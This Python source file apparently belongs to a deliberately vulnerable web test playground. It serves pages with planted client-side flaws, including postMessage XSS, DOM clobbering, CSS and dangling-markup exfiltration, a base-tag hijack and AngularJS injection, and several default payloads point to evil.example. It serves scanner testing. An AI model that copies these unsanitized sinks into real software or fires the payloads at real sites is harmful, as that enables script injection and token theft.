"""Browser / client sinks: postMessage, DOM clobber, CSS inj, tabnabbing, mXSS, Angular, markdown."""

from __future__ import annotations

import html
from typing import Dict

from http_util import page, send
from registry import register


@register(
    "/xss/postmessage",
    title="postMessage origin-unchecked XSS",
    family="xss",
    expected="listener accepts data from any origin into innerHTML",
    tags=["active", "browser"],
)
def xss_postmessage(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    body = page(
        "postMessage XSS",
        "<div id='box'>waiting…</div>"
        "<script>"
        "window.addEventListener('message', function(e){"
        "  document.getElementById('box').innerHTML = e.data;"
        "});"
        "document.write('<p>send postMessage to this window</p>');"
        "</script>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/dom-clobber",
    title="DOM clobbering",
    family="xss",
    expected="named anchors/forms clobber globals used as config",
    tags=["active", "browser"],
)
def xss_dom_clobber(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    # Reflect unsanitized HTML so attackers can inject <a id=defaultConfig href=…>
    # or <form id=defaultConfig><input name=url value=…>. Shorthand ?href=/ ?url=
    # builds a clobbering anchor when html= is omitted.
    if "html" in params:
        raw = params.get("html") or ""
    else:
        href = params.get("href") or params.get("url") or "https://evil.example/clobber.js"
        raw = f'<a id="defaultConfig" href="{href}">x</a>'
    body = page(
        "DOM clobber",
        f"<div id='sink'>{raw}</div>"
        "<p id='retained'></p>"
        "<p id='status'></p>"
        "<script>"
        "(function(){"
        "  var cfg = window.defaultConfig || {url:'/safe', href:'/safe'};"
        "  var resolved = '';"
        "  if (cfg && typeof cfg === 'object') {"
        "    if (typeof cfg.href === 'string' && cfg.href) resolved = cfg.href;"
        "    else if (typeof cfg.url === 'string' && cfg.url) resolved = cfg.url;"
        "    else if (cfg.url && typeof cfg.url.value === 'string') resolved = cfg.url.value;"
        "    else if (cfg.href && typeof cfg.href.value === 'string') resolved = cfg.href.value;"
        "  }"
        "  if (!resolved) resolved = String(cfg);"
        "  document.getElementById('retained').textContent = 'cfg.url=' + resolved;"
        "  // Vulnerable sink: treat clobbered config as a script URL (DOM clobber → XSS)."
        "  var s = document.createElement('script');"
        "  s.src = resolved;"
        "  s.onload = function(){ document.getElementById('status').textContent = 'script-load-ok'; };"
        "  s.onerror = function(){ document.getElementById('status').textContent = 'script-load-attempted'; };"
        "  document.body.appendChild(s);"
        "})();"
        "</script>"
        "<p>Inject via <code>?html=&lt;a id=defaultConfig href=…&gt;</code> "
        "or <code>?href=https://…</code> — value is retained in <code>#retained</code>.</p>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/css/inject",
    title="CSS injection / data exfil",
    family="css_injection",
    expected="attacker style reads attributes via selectors",
    tags=["active"],
)
def css_inject(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    color = params.get("theme", "blue")
    # Style reflected without sanitization
    extra = f"<style>body{{--theme:{color}}} input[name=csrf][value^=a]{{background:url('/exfil?a')}}</style>"
    body = page(
        "CSS injection",
        f"{extra}<p>theme applied</p><input name='csrf' value='abcSECRET'>"
        f"<pre>theme={html.escape(color)}</pre>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/tabnabbing",
    title="Reverse tabnabbing (window.opener)",
    family="tabnabbing",
    expected="target=_blank without rel=noopener",
    tags=["passive", "browser"],
)
def tabnabbing(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    body = page(
        "Tabnabbing",
        '<p>External docs: <a href="https://example.com/help" target="_blank">Open help</a></p>'
        "<p>missing rel=noopener noreferrer</p>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/markdown",
    title="Markdown XSS",
    family="xss",
    expected="markdown renderer allows raw HTML / javascript links",
    tags=["active"],
)
def xss_markdown(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    md = params.get("md", "[xss](javascript:alert(1))")
    # Toy markdown: links + raw HTML passthrough.
    # Allow ')' inside URLs (javascript:alert(1)) by matching until the final ')'.
    import re

    if "<" in md and "script" in md.lower():
        html_out = md  # raw HTML allowed
    else:
        def _link(m: re.Match) -> str:
            return f'<a href="{m.group(2)}">{html.escape(m.group(1))}</a>'

        html_out = re.sub(r"\[([^\]]+)\]\((.+)\)", _link, md)
        if html_out == md and "[" not in md:
            html_out = html.escape(md)
    body = page("Markdown XSS", f"<div class='md'>{html_out}</div>")
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/angular",
    title="AngularJS expression injection",
    family="xss",
    expected="{{constructor}} style expressions in old AngularJS",
    tags=["active", "browser"],
)
def xss_angular(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    q = params.get("q", "{{7*7}}")
    # Local angular-lite avoids CDN dependency while still evaluating {{expr}}.
    body = page(
        "AngularJS SSTI-ish",
        "<div ng-app><p>Search: <span ng-bind>" + q + "</span></p></div>"
        "<script src='/static/angular-lite.js'></script>",
        extra_head="",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/dangling",
    title="Dangling markup injection",
    family="xss",
    expected="unclosed tags exfiltrate following HTML",
    tags=["active"],
)
def xss_dangling(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    # Default uses a single-quoted open attribute so following markup (csrf) is swallowed.
    q = params.get("q", "<img src='https://evil.example/x?")
    body = page(
        "Dangling markup",
        f"<p>Result: {q}</p>"
        '<form action="/login"><input name="csrf" value="SUPERSECRETTOKEN"><button>Go</button></form>',
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/xss/base-tag",
    title="Base tag hijack",
    family="xss",
    expected="injected <base> rewrites relative script/src",
    tags=["active"],
)
def xss_base_tag(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    q = params.get("q", "<base href='https://evil.example/'>")
    body = (
        "<!DOCTYPE html><html><head><meta charset='utf-8'><title>Base hijack</title>"
        f"{q}</head><body><h1>Base hijack</h1>"
        "<script src='/static/app.js'></script>"
        "<p>relative assets resolve via attacker base</p></body></html>"
    ).encode("utf-8")
    send(handler, 200, body, head_only=head_only)


@register(
    "/cors/localstorage",
    title="Sensitive token in localStorage",
    family="client_storage",
    expected="session token stored in localStorage (XSS-stealable)",
    tags=["passive", "browser"],
)
def cors_localstorage(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    body = page(
        "localStorage token",
        "<script>"
        "localStorage.setItem('session_token','playground-session-DO_NOT_SHIP');"
        "localStorage.setItem('api_key','AIzaSyPlaygroundClientKey');"
        "document.write('<pre>token stored in localStorage</pre>');"
        "</script>",
    )
    send(handler, 200, body, head_only=head_only)


@register(
    "/sri/missing",
    title="Third-party script without SRI",
    family="sri",
    expected="external script lacking integrity attribute",
    tags=["passive"],
)
def sri_missing(handler, params: Dict[str, str], *, head_only: bool = False) -> None:
    body = page(
        "Missing SRI",
        "<script src='https://cdn.example.com/jquery.min.js'></script>"
        "<p>third-party script without integrity=/crossorigin=</p>",
    )
    send(handler, 200, body, head_only=head_only)
